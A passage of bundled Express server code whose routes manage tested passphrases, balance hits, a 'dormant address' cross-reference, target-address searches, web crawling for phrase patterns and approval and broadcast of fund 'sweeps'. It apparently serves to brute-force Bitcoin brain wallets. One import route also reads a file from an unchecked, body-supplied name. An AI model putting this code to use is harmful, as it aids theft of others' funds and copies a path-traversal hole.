  } catch (error) {
    console.error("[BalanceQueue] Rate limit error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.post("/clear-failed", isAuthenticated, standardLimiter4, (req, res) => {
  try {
    const cleared = balanceQueue.clearFailed();
    res.json({
      cleared,
      stats: balanceQueue.getStats()
    });
  } catch (error) {
    console.error("[BalanceQueue] Clear failed error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.get("/background", standardLimiter4, async (req, res) => {
  res.setHeader("Cache-Control", "no-store");
  try {
    const dbHits = getBalanceHits();
    const dbHitCount = dbHits.length;
    if (!balanceQueue.isReady()) {
      res.json({
        enabled: true,
        checked: 0,
        hits: dbHitCount,
        rate: 0,
        pending: 0,
        initializing: true
      });
      return;
    }
    const status = balanceQueue.getBackgroundStatus();
    res.json({
      enabled: status.enabled,
      checked: status.checked,
      hits: dbHitCount,
      rate: status.rate,
      pending: status.pending,
      apiStats: status.apiStats,
      sessionHits: status.hits
    });
  } catch (error) {
    console.error("[BalanceQueue] Background status error:", error);
    res.json({
      enabled: true,
      checked: 0,
      hits: 0,
      rate: 0,
      pending: 0,
      initializing: true
    });
  }
});
balanceQueueRouter.post("/background/start", isAuthenticated, standardLimiter4, (req, res) => {
  try {
    balanceQueue.startBackgroundWorker();
    res.json({
      message: "Background worker started",
      status: balanceQueue.getBackgroundStatus()
    });
  } catch (error) {
    console.error("[BalanceQueue] Background start error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.post("/background/stop", isAuthenticated, standardLimiter4, (req, res) => {
  try {
    const stopped = balanceQueue.stopBackgroundWorker();
    if (!stopped) {
      res.status(409).json({
        message: "Worker is in ALWAYS-ON mode and cannot be stopped",
        alwaysOn: true,
        status: balanceQueue.getBackgroundStatus()
      });
      return;
    }
    res.json({
      message: "Background worker stopped",
      status: balanceQueue.getBackgroundStatus()
    });
  } catch (error) {
    console.error("[BalanceQueue] Background stop error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.get("/integration-stats", standardLimiter4, (req, res) => {
  res.setHeader("Cache-Control", "no-store");
  try {
    const stats2 = getQueueIntegrationStats();
    res.json(stats2);
  } catch (error) {
    console.error("[BalanceQueue] Integration stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.get("/backfill/stats", standardLimiter4, async (req, res) => {
  try {
    const { getBackfillStats: getBackfillStats2, getBackfillProgress: getBackfillProgress2 } = await Promise.resolve().then(() => (init_balance_queue_backfill(), balance_queue_backfill_exports));
    res.json({
      available: getBackfillStats2(),
      progress: getBackfillProgress2()
    });
  } catch (error) {
    console.error("[Backfill] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.post("/backfill/start", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { startBackfill: startBackfill2 } = await Promise.resolve().then(() => (init_balance_queue_backfill(), balance_queue_backfill_exports));
    const source = req.body.source || "tested-phrases";
    const batchSize = req.body.batchSize || 100;
    startBackfill2({ source, batchSize }).then((result) => {
      console.log("[Backfill] Completed:", result);
    });
    res.json({
      message: `Backfill started from ${source}`,
      status: "running"
    });
  } catch (error) {
    console.error("[Backfill] Start error:", error);
    res.status(500).json({ error: error.message });
  }
});
var blockchainApiRouter = Router9();
blockchainApiRouter.get("/stats", standardLimiter4, async (req, res) => {
  res.setHeader("Cache-Control", "no-store");
  try {
    const { freeBlockchainAPI: freeBlockchainAPI2 } = await Promise.resolve().then(() => (init_blockchain_free_api(), blockchain_free_api_exports));
    const stats2 = freeBlockchainAPI2.getStats();
    const capacity = freeBlockchainAPI2.getAvailableCapacity();
    res.json({
      ...stats2,
      availableCapacity: capacity,
      totalCapacity: 230,
      effectiveCapacity: Math.round(capacity * (1 + stats2.cacheHitRate * 9))
    });
  } catch (error) {
    console.error("[BlockchainAPI] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
blockchainApiRouter.post("/reset", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { freeBlockchainAPI: freeBlockchainAPI2 } = await Promise.resolve().then(() => (init_blockchain_free_api(), blockchain_free_api_exports));
    freeBlockchainAPI2.resetProviderHealth();
    res.json({
      message: "All providers reset to healthy state",
      stats: freeBlockchainAPI2.getStats()
    });
  } catch (error) {
    console.error("[BlockchainAPI] Reset error:", error);
    res.status(500).json({ error: error.message });
  }
});
blockchainApiRouter.post("/reset/:provider", standardLimiter4, async (req, res) => {
  try {
    const { resetProvider: resetProvider2 } = await Promise.resolve().then(() => (init_blockchain_api_router(), blockchain_api_router_exports));
    const providerName = req.params.provider;
    resetProvider2(providerName);
    res.json({
      message: `Provider ${providerName} reset successfully`
    });
  } catch (error) {
    console.error("[BlockchainAPI] Reset error:", error);
    res.status(500).json({ error: error.message });
  }
});
var dormantCrossRefRouter = Router9();
dormantCrossRefRouter.get("/stats", standardLimiter4, async (req, res) => {
  try {
    const { dormantCrossRef: dormantCrossRef2 } = await Promise.resolve().then(() => (init_dormant_cross_ref(), dormant_cross_ref_exports));
    const stats2 = dormantCrossRef2.getStats();
    const totalValue = dormantCrossRef2.getTotalValue();
    res.json({
      ...stats2,
      totalValue
    });
  } catch (error) {
    console.error("[DormantCrossRef] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
dormantCrossRefRouter.get("/matches", standardLimiter4, async (req, res) => {
  try {
    const { dormantCrossRef: dormantCrossRef2 } = await Promise.resolve().then(() => (init_dormant_cross_ref(), dormant_cross_ref_exports));
    const matches = dormantCrossRef2.getAllMatches();
    res.json({
      matches,
      count: matches.length
    });
  } catch (error) {
    console.error("[DormantCrossRef] Matches error:", error);
    res.status(500).json({ error: error.message });
  }
});
dormantCrossRefRouter.get("/top", standardLimiter4, async (req, res) => {
  try {
    const { dormantCrossRef: dormantCrossRef2 } = await Promise.resolve().then(() => (init_dormant_cross_ref(), dormant_cross_ref_exports));
    const limit = parseInt(req.query.limit) || 100;
    const topDormant = dormantCrossRef2.getTopDormant(limit);
    res.json({
      addresses: topDormant,
      count: topDormant.length
    });
  } catch (error) {
    console.error("[DormantCrossRef] Top dormant error:", error);
    res.status(500).json({ error: error.message });
  }
});
dormantCrossRefRouter.post("/check", standardLimiter4, async (req, res) => {
  try {
    const { dormantCrossRef: dormantCrossRef2 } = await Promise.resolve().then(() => (init_dormant_cross_ref(), dormant_cross_ref_exports));
    const { address, addresses: addresses2 } = req.body;
    if (address) {
      const result = dormantCrossRef2.checkAddress(address);
      return res.json(result);
    }
    if (addresses2 && Array.isArray(addresses2)) {
      const result = dormantCrossRef2.checkAddresses(addresses2);
      return res.json(result);
    }
    res.status(400).json({ error: "Provide address or addresses array" });
  } catch (error) {
    console.error("[DormantCrossRef] Check error:", error);
    res.status(500).json({ error: error.message });
  }
});
var basinSyncRouter = Router9();
basinSyncRouter.get("/snapshots", standardLimiter4, async (req, res) => {
  try {
    const { oceanBasinSync: oceanBasinSync2 } = await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
    const snapshots = oceanBasinSync2.listBasinSnapshots();
    res.json({
      snapshots,
      count: snapshots.length
    });
  } catch (error) {
    console.error("[BasinSync] List error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.get("/snapshots/:filename", standardLimiter4, async (req, res) => {
  try {
    await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
    const filename = req.params.filename;
    if (!filename.endsWith(".json") || filename.includes("..") || filename.includes("/")) {
      return res.status(400).json({ error: "Invalid filename" });
    }
    const basePath = path16.join(process.cwd(), "data", "basin-sync", filename);
    if (!fs17.existsSync(basePath)) {
      return res.status(404).json({ error: "Basin snapshot not found" });
    }
    const packet = JSON.parse(fs17.readFileSync(basePath, "utf-8"));
    res.json(packet);
  } catch (error) {
    console.error("[BasinSync] Get snapshot error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.post("/export", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanBasinSync: oceanBasinSync2 } = await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const ocean = oceanSessionManager2.getActiveAgent();
    if (!ocean) {
      return res.status(400).json({ error: "No active Ocean session to export" });
    }
    const packet = oceanBasinSync2.exportBasin(ocean);
    const filepath = oceanBasinSync2.saveBasinSnapshot(packet);
    res.json({
      success: true,
      oceanId: packet.oceanId,
      filename: filepath ? path16.basename(filepath) : "memory-only",
      packetSizeBytes: JSON.stringify(packet).length,
      consciousness: {
        phi: packet.consciousness.phi,
        kappaEff: packet.consciousness.kappaEff,
        regime: packet.regime
      },
      exploredRegions: packet.exploredRegions.length,
      patterns: {
        highPhi: packet.patterns.highPhiPhrases.length,
        resonantWords: packet.patterns.resonantWords.length
      }
    });
  } catch (error) {
    console.error("[BasinSync] Export error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.post("/import", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanBasinSync: oceanBasinSync2 } = await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const ocean = oceanSessionManager2.getActiveAgent();
    if (!ocean) {
      return res.status(400).json({ error: "No active Ocean session to import into" });
    }
    const { filename, mode } = req.body;
    if (!filename) {
      return res.status(400).json({ error: "filename is required" });
    }
    const validModes = ["full", "partial", "observer"];
    const importMode = mode && validModes.includes(mode) ? mode : "partial";
    const basePath = path16.join(process.cwd(), "data", "basin-sync", filename);
    if (!fs17.existsSync(basePath)) {
      return res.status(404).json({ error: "Basin snapshot not found" });
    }
    const packet = JSON.parse(fs17.readFileSync(basePath, "utf-8"));
    const result = await oceanBasinSync2.importBasin(ocean, packet, importMode);
    res.json({
      success: result.success,
      mode: result.mode,
      sourceOceanId: packet.oceanId,
      phiBefore: result.phiBefore,
      phiAfter: result.phiAfter,
      phiDelta: result.phiDelta,
      basinDriftBefore: result.basinDriftBefore,
      basinDriftAfter: result.basinDriftAfter,
      observerEffectDetected: result.observerEffectDetected,
      geometricDistance: result.geometricDistanceToSource
    });
  } catch (error) {
    console.error("[BasinSync] Import error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.delete("/snapshots/:filename", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanBasinSync: oceanBasinSync2 } = await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
    const filename = req.params.filename;
    if (!filename.endsWith(".json") || filename.includes("..") || filename.includes("/")) {
      return res.status(400).json({ error: "Invalid filename" });
    }
    const deleted = oceanBasinSync2.deleteBasinSnapshot(filename);
    if (deleted) {
      res.json({ success: true, message: `Deleted ${filename}` });
    } else {
      res.status(404).json({ error: "Basin snapshot not found" });
    }
  } catch (error) {
    console.error("[BasinSync] Delete error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.get("/coordinator/status", standardLimiter4, async (req, res) => {
  try {
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const activeOcean = oceanSessionManager2.getActiveAgent();
    if (!activeOcean) {
      return res.json({
        isRunning: false,
        localId: null,
        peerCount: 0,
        lastBroadcastState: null,
        queueLength: 0,
        message: "No active Ocean agent - start an investigation to enable continuous sync"
      });
    }
    const coordinator = activeOcean.getBasinSyncCoordinator();
    if (!coordinator) {
      return res.json({
        isRunning: false,
        localId: null,
        peerCount: 0,
        lastBroadcastState: null,
        queueLength: 0,
        message: "Coordinator not initialized - continuous sync will start automatically"
      });
    }
    const status = coordinator.getStatus();
    const peers = coordinator.getPeers();
    const syncData = coordinator.getSyncData();
    res.json({
      ...status,
      peers: peers.map((p) => ({
        id: p.id,
        mode: p.mode,
        lastSeen: p.lastSeen,
        trustLevel: p.trustLevel
      })),
      syncData: {
        exploredRegionsCount: syncData.exploredRegions.length,
        highPhiPatternsCount: syncData.highPhiPatterns.length,
        resonantWordsCount: syncData.resonantWords.length
      }
    });
  } catch (error) {
    console.error("[BasinSync] Coordinator status error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.post("/coordinator/force", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const activeOcean = oceanSessionManager2.getActiveAgent();
    if (!activeOcean) {
      return res.status(400).json({ error: "No active Ocean agent" });
    }
    const coordinator = activeOcean.getBasinSyncCoordinator();
    if (!coordinator) {
      return res.status(400).json({
        error: "Coordinator not initialized - start an investigation first"
      });
    }
    coordinator.forceSync();
    res.json({
      success: true,
      message: "Force sync triggered - full basin packet queued for broadcast",
      status: coordinator.getStatus()
    });
  } catch (error) {
    console.error("[BasinSync] Force sync error:", error);
    res.status(500).json({ error: error.message });
  }
});
basinSyncRouter.post("/coordinator/notify", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const activeOcean = oceanSessionManager2.getActiveAgent();
    if (!activeOcean) {
      return res.status(400).json({ error: "No active Ocean agent" });
    }
    activeOcean.notifyBasinChange();
    res.json({ success: true, message: "Basin change notification sent" });
  } catch (error) {
    console.error("[BasinSync] Notify error:", error);
    res.status(500).json({ error: error.message });
  }
});
var geometricDiscoveryRouter = Router9();
var strictLimiter2 = rateLimit6({
  windowMs: 60 * 1e3,
  max: 5,
  message: { error: "Rate limit exceeded. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
geometricDiscoveryRouter.get("/status", standardLimiter4, async (req, res) => {
  try {
    const { oceanDiscoveryController: oceanDiscoveryController2 } = await Promise.resolve().then(() => (init_ocean_discovery_controller(), ocean_discovery_controller_exports));
    const state = oceanDiscoveryController2.getDiscoveryState();
    res.json({
      hasTarget: !!state?.targetCoords,
      position: state?.currentPosition ? {
        spacetime: state.currentPosition.spacetime,
        phi: state.currentPosition.phi,
        regime: state.currentPosition.regime
      } : null,
      target: state?.targetCoords ? {
        spacetime: state.targetCoords.spacetime,
        phi: state.targetCoords.phi,
        regime: state.targetCoords.regime
      } : null,
      discoveries: state?.discoveries?.length || 0,
      tavilyEnabled: oceanDiscoveryController2.isTavilyEnabled()
    });
  } catch (error) {
    console.error("[GeometricDiscovery] Status error:", error);
    res.status(500).json({ error: error.message });
  }
});
geometricDiscoveryRouter.post("/estimate", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanDiscoveryController: oceanDiscoveryController2 } = await Promise.resolve().then(() => (init_ocean_discovery_controller(), ocean_discovery_controller_exports));
    const { targetAddress } = req.body;
    if (!targetAddress) {
      return res.status(400).json({ error: "targetAddress required" });
    }
    const coords = await oceanDiscoveryController2.estimateCoordinates(targetAddress);
    if (coords) {
      res.json({
        success: true,
        coordinates: {
          spacetime: coords.spacetime,
          culturalDimensions: coords.cultural.length,
          phi: coords.phi,
          regime: coords.regime
        }
      });
    } else {
      res.json({ success: false, message: "Could not estimate coordinates" });
    }
  } catch (error) {
    console.error("[GeometricDiscovery] Estimate error:", error);
    res.status(500).json({ error: error.message });
  }
});
geometricDiscoveryRouter.post("/discover", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanDiscoveryController: oceanDiscoveryController2 } = await Promise.resolve().then(() => (init_ocean_discovery_controller(), ocean_discovery_controller_exports));
    const result = await oceanDiscoveryController2.discoverCulturalContext();
    res.json({
      success: true,
      discoveries: result.discoveries,
      patterns: result.patterns,
      entropyGained: result.entropyGained
    });
  } catch (error) {
    console.error("[GeometricDiscovery] Discover error:", error);
    res.status(500).json({ error: error.message });
  }
});
geometricDiscoveryRouter.post("/search-era", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { oceanDiscoveryController: oceanDiscoveryController2 } = await Promise.resolve().then(() => (init_ocean_discovery_controller(), ocean_discovery_controller_exports));
    const { keywords, era } = req.body;
    if (!keywords || !Array.isArray(keywords)) {
      return res.status(400).json({ error: "keywords array required" });
    }
    const discoveries = await oceanDiscoveryController2.searchBitcoinEra(keywords, era || "pizza_era");
    res.json({
      success: true,
      discoveries: discoveries.map((d) => ({
        source: d.source,
        phi: d.phi,
        patterns: d.patterns.slice(0, 10),
        regime: d.coords.regime,
        entropyReduction: d.entropyReduction
      }))
    });
  } catch (error) {
    console.error("[GeometricDiscovery] Search era error:", error);
    res.status(500).json({ error: error.message });
  }
});
geometricDiscoveryRouter.post("/crawl", isAuthenticated, strictLimiter2, async (req, res) => {
  try {
    const { oceanDiscoveryController: oceanDiscoveryController2 } = await Promise.resolve().then(() => (init_ocean_discovery_controller(), ocean_discovery_controller_exports));
    const { url } = req.body;
    if (!url) {
      return res.status(400).json({ error: "url required" });
    }
    const result = await oceanDiscoveryController2.crawlUrl(url);
    res.json({
      success: true,
      patternsFound: result.patterns.length,
      patterns: result.patterns.slice(0, 50),
      coords: {
        spacetime: result.coords.spacetime,
        phi: result.coords.phi,
        regime: result.coords.regime
      }
    });
  } catch (error) {
    console.error("[GeometricDiscovery] Crawl error:", error);
    res.status(500).json({ error: error.message });
  }
});

// server/routes/sweeps.ts
init_sweep_approval();
init_replitAuth();
import { Router as Router10 } from "express";
var sweepsRouter = Router10();
sweepsRouter.get("/", async (req, res) => {
  try {
    const status = req.query.status;
    const sweeps = await sweepApprovalService.getPendingSweeps(status);
    res.json({ success: true, sweeps });
  } catch (error) {
    console.error("[API] Error getting sweeps:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.get("/stats", async (req, res) => {
  try {
    const stats2 = await sweepApprovalService.getStats();
    res.json({ success: true, stats: stats2 });
  } catch (error) {
    console.error("[API] Error getting sweep stats:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.get("/audit/:sweepId?", async (req, res) => {
  try {
    const auditLog = await sweepApprovalService.getAuditLog(req.params.sweepId);
    res.json({ success: true, auditLog });
  } catch (error) {
    console.error("[API] Error getting audit log:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.get("/:id", async (req, res) => {
  try {
    const sweep = await sweepApprovalService.getSweepById(req.params.id);
    if (!sweep) {
      return res.status(404).json({ success: false, error: "Sweep not found" });
    }
    res.json({ success: true, sweep });
  } catch (error) {
    console.error("[API] Error getting sweep:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.post("/:id/approve", isAuthenticated, async (req, res) => {
  try {
    const approvedBy = req.user?.email || req.user?.id || "operator";
    const result = await sweepApprovalService.approveSweep(req.params.id, approvedBy);
    if (!result.success) {
      return res.status(400).json(result);
    }
    res.json(result);
  } catch (error) {
    console.error("[API] Error approving sweep:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.post("/:id/broadcast", isAuthenticated, async (req, res) => {
  try {
    const result = await sweepApprovalService.broadcastSweep(req.params.id);
    if (!result.success) {
      return res.status(400).json(result);
    }
    res.json(result);
  } catch (error) {
    console.error("[API] Error broadcasting sweep:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.post("/:id/reject", isAuthenticated, async (req, res) => {
  try {
    const { reason } = req.body;
    const result = await sweepApprovalService.rejectSweep(req.params.id, reason || "Manual rejection");
    if (!result.success) {
      return res.status(400).json(result);
    }
    res.json(result);
  } catch (error) {
    console.error("[API] Error rejecting sweep:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
sweepsRouter.post("/:id/refresh", async (req, res) => {
  try {
    const result = await sweepApprovalService.refreshBalance(req.params.id);
    res.json(result);
  } catch (error) {
    console.error("[API] Error refreshing sweep balance:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// server/routes/admin.ts
init_storage();
init_ocean_session_manager();
init_activity_log_store();
init_balance_queue_integration();
init_blockchain_scanner();
import { Router as Router11 } from "express";
import rateLimit7 from "express-rate-limit";
var generousLimiter5 = rateLimit7({
  windowMs: 60 * 1e3,
  max: 60,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var standardLimiter5 = rateLimit7({
  windowMs: 60 * 1e3,
  max: 20,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var adminRouter = Router11();
adminRouter.get("/health", async (req, res) => {
  try {
    const { healthCheckHandler: healthCheckHandler2 } = await Promise.resolve().then(() => (init_api_health(), api_health_exports));
    await healthCheckHandler2(req, res);
  } catch (error) {
    console.error("[API] Health check error:", error);
    res.status(503).json({
      status: "down",
      timestamp: Date.now(),
      error: error.message
    });
  }
});
adminRouter.get("/kernel/status", async (req, res) => {
  try {
    const activeAgent = oceanSessionManager.getActiveAgent();
    if (!activeAgent) {
      return res.json({
        status: "idle",
        message: "No active kernel session",
        timestamp: Date.now()
      });
    }
    const coordinator = activeAgent.getBasinSyncCoordinator();
    const metrics = coordinator ? {
      phi: 0,
      kappa: 0,
      regime: "unknown",
      basinCoords: [],
      timestamp: Date.now()
    } : null;
    res.json({
      status: "active",
      sessionId: "active-session",
      metrics: metrics && metrics.phi > 0 ? {
        phi: metrics.phi,
        kappa_eff: metrics.kappa,
        regime: metrics.regime,
        in_resonance: metrics.kappa >= 60 && metrics.kappa <= 68,
        basin_coords: metrics.basinCoords,
        timestamp: metrics.timestamp
      } : null,
      uptime: 0,
      timestamp: Date.now(),
      message: metrics ? void 0 : "Metrics not yet available - session initializing"
    });
  } catch (error) {
    console.error("[API] Kernel status error:", error);
    res.status(500).json({ error: error.message });
  }
});
adminRouter.get("/search/history", generousLimiter5, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const offset = parseInt(req.query.offset) || 0;
    const jobs = await storage.getSearchJobs();
    const sortedJobs = jobs.sort(
      (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
    );
    const paginatedJobs = sortedJobs.slice(offset, offset + limit);
    const enriched = await Promise.all(
      paginatedJobs.map(async (job) => {
        const candidates = await storage.getCandidates();
        const jobStart = new Date(job.createdAt).getTime();
        const jobEnd = job.updatedAt ? new Date(job.updatedAt).getTime() : Date.now();
        const jobCandidates = candidates.filter((c) => {
          const candidateTime = new Date(c.testedAt).getTime();
          return candidateTime >= jobStart && candidateTime <= jobEnd;
        });
        return {
          ...job,
          candidateCount: jobCandidates.length,
          highPhiCount: jobCandidates.filter((c) => c.score >= 75).length,
          phrasesGenerated: job.progress?.tested || 0
        };
      })
    );
    res.json({
      success: true,
      searches: enriched,
      total: sortedJobs.length,
      limit,
      offset
    });
  } catch (error) {
    console.error("[API] Search history error:", error);
    res.status(500).json({ error: error.message });
  }
});
adminRouter.post("/telemetry/capture", generousLimiter5, async (req, res) => {
  try {
    const { event_type, timestamp: timestamp2, trace_id, metadata } = req.body;
    if (!event_type || !timestamp2 || !trace_id) {
      return res.status(400).json({
        error: "Missing required fields: event_type, timestamp, trace_id"
      });
    }
    console.log("[Telemetry]", event_type, {
      traceId: trace_id,
      timestamp: new Date(timestamp2).toISOString(),
      metadata: metadata || {}
    });
    if (["search_initiated", "error_occurred", "result_rendered"].includes(event_type)) {
      activityLogStore.log({
        source: "system",
        category: "frontend_event",
        message: `Frontend event: ${event_type}`,
        type: event_type === "error_occurred" ? "error" : "info",
        metadata: {
          traceId: trace_id,
          ...metadata
        }
      });
    }
    res.json({
      success: true,
      captured: true,
      trace_id
    });
  } catch (error) {
    console.error("[API] Telemetry capture error:", error);
    res.status(500).json({ error: error.message });
  }
});
adminRouter.get("/admin/metrics", generousLimiter5, async (req, res) => {
  try {
    const jobs = await storage.getSearchJobs();
    const candidates = await storage.getCandidates();
    const balanceHits3 = getActiveBalanceHits();
    const queueStats = getQueueIntegrationStats();
    const completedJobs = jobs.filter((j) => j.status === "completed");
    const totalPhrasesTested = jobs.reduce((sum, j) => sum + (j.progress?.tested || 0), 0);
    const totalHighPhi = candidates.filter((c) => c.score >= 75).length;
    const avgSearchDuration = completedJobs.length > 0 ? completedJobs.reduce((sum, j) => {
      const startTime2 = new Date(j.createdAt).getTime();
      const endTime = j.updatedAt ? new Date(j.updatedAt).getTime() : Date.now();
      return sum + (endTime - startTime2);
    }, 0) / completedJobs.length : 0;
    res.json({
      success: true,
      timestamp: Date.now(),
      metrics: {
        search: {
          totalSearches: jobs.length,
          activeSearches: jobs.filter((j) => j.status === "running").length,
          completedSearches: completedJobs.length,
          failedSearches: jobs.filter((j) => j.status === "failed").length,
          totalPhrasesTested,
          highPhiCount: totalHighPhi,
          avgSearchDuration: Math.round(avgSearchDuration / 1e3)
        },
        performance: {
          avgSearchDurationMs: Math.round(avgSearchDuration),
          phrasesPerSecond: totalPhrasesTested / Math.max(1, completedJobs.length * (avgSearchDuration / 1e3)),
          cacheHitRate: 0
        },
        balance: {
          activeHits: balanceHits3.length,
          queueStats,
          totalVerified: balanceHits3.filter((h) => h.balance > 0).length
        },
        kernel: {
          status: oceanSessionManager.getActiveAgent() ? "active" : "idle",
          uptime: 0
        }
      }
    });
  } catch (error) {
    console.error("[API] Admin metrics error:", error);
    res.status(500).json({ error: error.message });
  }
});

// server/routes/olympus.ts
init_olympus_client();
init_replitAuth();
import { Router as Router12 } from "express";
import { z as z5 } from "zod";
import http from "http";
import https from "https";
import { URL as URL2 } from "url";
var router3 = Router12();
var olympusClient2 = new OlympusClient(
  process.env.PYTHON_BACKEND_URL || "http://localhost:5001"
);
var targetSchema = z5.object({
  target: z5.string().min(1).max(1e3),
  context: z5.record(z5.any()).optional()
});
var chatMessageSchema = z5.object({
  message: z5.string().min(1).max(1e4),
  conversation_history: z5.array(z5.any()).max(100).optional()
});
var searchQuerySchema = z5.object({
  query: z5.string().min(1).max(500)
});
function validateInput(schema) {
  return (req, res, next) => {
    try {
      schema.parse(req.body);
      next();
    } catch (error) {
      if (error instanceof z5.ZodError) {
        res.status(400).json({
          error: "Invalid input",
          details: error.errors.map((e) => ({ path: e.path.join("."), message: e.message }))
        });
        return;
      }
      next(error);
    }
  };
}
router3.post("/zeus/chat", isAuthenticated, async (req, res) => {
  try {
    const backendUrl = process.env.PYTHON_BACKEND_URL || "http://localhost:5001";
    const contentType = req.get("Content-Type") || "";
    if (!contentType.includes("multipart/form-data")) {
      if (req.is("application/json")) {
        const result = chatMessageSchema.safeParse(req.body);
        if (!result.success) {
          res.status(400).json({
            error: "Invalid input",
            details: result.error.errors.map((e) => ({ path: e.path.join("."), message: e.message }))
          });
          return;
        }
      }
      const response = await fetch(`${backendUrl}/olympus/zeus/chat`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(req.body)
      });
      if (!response.ok) {
        throw new Error(`Python backend returned ${response.status}`);
      }
      const data = await response.json();
      res.json(data);
      return;
    }
    const targetUrl = new URL2(`${backendUrl}/olympus/zeus/chat`);
    const isHttps = targetUrl.protocol === "https:";
    const httpModule = isHttps ? https : http;
    const proxyHeaders = {
      "Content-Type": contentType
    };
    if (req.headers["content-length"]) {
      proxyHeaders["Content-Length"] = req.headers["content-length"];
    }
    if (req.headers["transfer-encoding"]) {
      proxyHeaders["Transfer-Encoding"] = req.headers["transfer-encoding"];
    }
    const proxyReq = httpModule.request({
      hostname: targetUrl.hostname,
      port: targetUrl.port || (isHttps ? 443 : 80),
      path: targetUrl.pathname,
      method: "POST",
      headers: proxyHeaders
    }, (proxyRes) => {
      let data = "";
      proxyRes.on("data", (chunk) => data += chunk);
      proxyRes.on("end", () => {
        try {
          const jsonData = JSON.parse(data);
          res.status(proxyRes.statusCode || 200).json(jsonData);
        } catch {
          res.status(proxyRes.statusCode || 500).send(data);
        }
      });
    });
    proxyReq.on("error", (error) => {
      console.error("[Olympus] Proxy error:", error);
      res.status(500).json({
        error: "Failed to communicate with Mount Olympus",
        response: "\u26A1 The divine council is unreachable.",
        metadata: { type: "error" }
      });
    });
    req.pipe(proxyReq);
  } catch (error) {
    console.error("[Olympus] Zeus chat error:", error);
    res.status(500).json({
      error: "Failed to communicate with Mount Olympus",
      response: "\u26A1 The divine council is unreachable. Please ensure the Python backend is running.",
      metadata: { type: "error" }
    });
  }
});
router3.post("/zeus/search", isAuthenticated, validateInput(searchQuerySchema), async (req, res) => {
  try {
    const backendUrl = process.env.PYTHON_BACKEND_URL || "http://localhost:5001";
    const response = await fetch(`${backendUrl}/olympus/zeus/search`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(req.body)
    });
    if (!response.ok) {
      throw new Error(`Python backend returned ${response.status}`);
    }
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error("[Olympus] Zeus search error:", error);
    res.status(500).json({
      error: "Failed to execute search",
      response: "\u26A1 The Oracle is silent.",
      metadata: { type: "error" }
    });
  }
});
router3.get("/zeus/memory/stats", isAuthenticated, async (req, res) => {
  try {
    const backendUrl = process.env.PYTHON_BACKEND_URL || "http://localhost:5001";
    const response = await fetch(`${backendUrl}/olympus/zeus/memory/stats`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json"
      }
    });
    if (!response.ok) {
      throw new Error(`Python backend returned ${response.status}`);
    }
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error("[Olympus] Memory stats error:", error);
    res.status(500).json({
      error: "Failed to retrieve memory stats"
    });
  }
});
router3.post("/poll", isAuthenticated, validateInput(targetSchema), async (req, res) => {
  try {
    const result = await olympusClient2.pollPantheon(
      req.body.target,
      req.body.context
    );
    res.json(result);
  } catch (error) {
    console.error("[Olympus] Poll error:", error);
    res.status(500).json({
